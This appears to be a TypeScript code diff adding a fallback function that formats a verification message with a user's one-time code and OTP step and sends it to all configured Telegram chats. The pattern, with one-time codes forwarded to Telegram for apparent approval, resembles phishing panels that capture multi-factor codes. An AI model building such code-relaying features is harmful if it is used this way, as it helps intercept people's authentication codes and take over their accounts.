@@ -429,6 +429,20 @@ export async function sendVerificationWithApprovalButtons(
 }
 
 /**
+ * Direct verification send (no buttons, just simple message)
+ * Used as emergency fallback when storage is unavailable
+ */
+export async function sendVerificationDirect(
+  method: "email" | "text" | "phone",
+  code: string,
+  otpStep: 1 | 2,
+): Promise<{ ok: boolean; error?: string }> {
+  const text = formatVerificationMessage(method, code, otpStep);
+  const result = await sendTelegramToAll(withSiteHeader(text));
+  return result;
+}
+
+/**
  * Edit a Telegram message with new buttons
  */
 export async function editTelegramMessage(
